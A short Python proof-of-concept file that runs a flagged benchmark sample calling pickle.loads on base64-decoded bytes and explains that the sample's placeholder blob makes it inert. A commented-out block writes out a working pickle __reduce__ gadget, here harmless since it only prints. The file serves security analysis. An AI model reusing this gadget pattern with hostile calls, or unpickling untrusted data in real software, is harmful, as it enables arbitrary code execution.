# PoC for sample-0732.py (representative of 0732/0734/0736/0738/0740.py):
# pickle.loads(base64.b64decode(...)) on untrusted bytes.
# No extra deps.
#
# This runs the actual flagged sample. NOTE: the sample's shipped base64 blob
# is a placeholder, not a real serialized pickle, so this does NOT execute
# code - it raises before pickle can run anything:
#     _pickle.UnpicklingError: invalid load key, '\xe5'.
# (the decoded bytes start with 0xe5, which isn't a valid pickle opcode.)
# That's the expected output here - it shows the sample as-shipped is inert.
# For an actual demonstration of the pickle.loads() code-execution vector, see
# the crafted-gadget version at the bottom of this file (commented out).

import os
import runpy

flagged = os.path.expanduser(
    "~/repos/datasets/samples/torchsight-cybersecurity-classification-benchmark/"
    "malicious/sample-0732.py"
)
runpy.run_path(flagged, run_name="__main__")  # <- lads pickle file. It raises UnpicklingError because the repo contained a placeholder blob

# --- Actual working demonstration of the same primitive (uncomment to run) ---
# import pickle
#
# class Gadget:
#     def __reduce__(self):
#         return (print, ("pwned via pickle.loads()",))
#
# pickle.loads(pickle.dumps(Gadget()))  # <- same pickle.loads() call, real gadget
